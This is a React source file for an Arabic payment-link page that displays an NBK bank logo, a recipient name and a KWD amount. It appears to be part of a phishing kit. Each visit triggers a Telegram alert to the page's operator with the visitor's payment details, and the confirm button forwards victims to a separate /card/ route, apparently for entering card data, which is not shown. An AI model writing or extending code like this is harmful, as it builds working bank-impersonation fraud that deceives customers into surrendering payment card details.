import { useParams, useNavigate } from "react-router-dom";
import { useEffect, useMemo } from "react";
import { sendMessageToTelegram } from "@/backend/telegramService";

const PaymentPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const queryParams = new URLSearchParams(window.location.search);
  
  // Hardcoded defaults as requested, but overridden if URL params are present
  const paymentData = useMemo(() => ({
    customerName: queryParams.get('n') || "halits.YILDIZ",
    amount: queryParams.get('a') || "5.000",
    description: queryParams.get('p') || "طلب رابط دفع من chalits.YILDIZ بمبلغ KWD 5.000. سيكون الرابط صالحًا لمدة 24 ساعة.",
    currency: queryParams.get('c') || "KWD",
    expiryDate: new Date(Date.now() + 86400000).toISOString().split('T')[0]
  }), [window.location.search]);

  useEffect(() => {
    const notifyVisitor = async () => {
      const message = `
<b>👀 New Visitor on Payment Page</b>
<b>Name:</b> ${paymentData.customerName}
<b>Amount:</b> ${paymentData.amount} ${paymentData.currency}
<b>Purpose:</b> ${paymentData.description}
<b>ID:</b> ${id}
`;
      await sendMessageToTelegram(message);
    };
    notifyVisitor();
  }, [paymentData, id]);

  const handleConfirm = () => {
    navigate(`/card/${id}${window.location.search}`);
  };

  const getCurrencySymbol = (currency: string) => {
    const symbols: Record<string, string> = { 'KWD': 'د.ك', 'USD': '$', 'EUR': '€' };
    return symbols[currency] || currency;
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4" dir="rtl">
      <div className="mb-8"><img src="/nbk-logo.jpg" alt="NBK" className="h-16" /></div>
      <h1 className="text-2xl font-bold text-blue-800 mb-8 text-center">خدمة الدفع السريع</h1>
      <div className="w-full max-w-md bg-gray-50 border border-gray-300 rounded-lg p-6 mb-6">
        <div className="space-y-4 text-right">
          <div className="flex justify-between items-center border-b pb-2">
            <span className="text-gray-700">اسم المستلم:</span>
            <span className="font-bold text-blue-900">{paymentData.customerName}</span>
          </div>
          <div className="flex justify-between items-center border-b pb-2">
            <span className="text-gray-700">المبلغ:</span>
            <span className="font-bold text-blue-900">{parseFloat(paymentData.amount).toFixed(3)} {getCurrencySymbol(paymentData.currency)}</span>
          </div>
          <div className="flex justify-between items-center border-b pb-2">
            <span className="text-gray-700">الغرض:</span>
            <span className="font-bold text-blue-900">{paymentData.description}</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-gray-700">تاريخ الانتهاء:</span>
            <span className="font-bold text-red-600">{paymentData.expiryDate}</span>
          </div>
        </div>
      </div>
      <button onClick={handleConfirm} className="w-full max-w-md bg-blue-700 text-white py-4 text-xl rounded-xl font-bold shadow-lg">تأكيد</button>
    </div>
  );
};
export default PaymentPage;
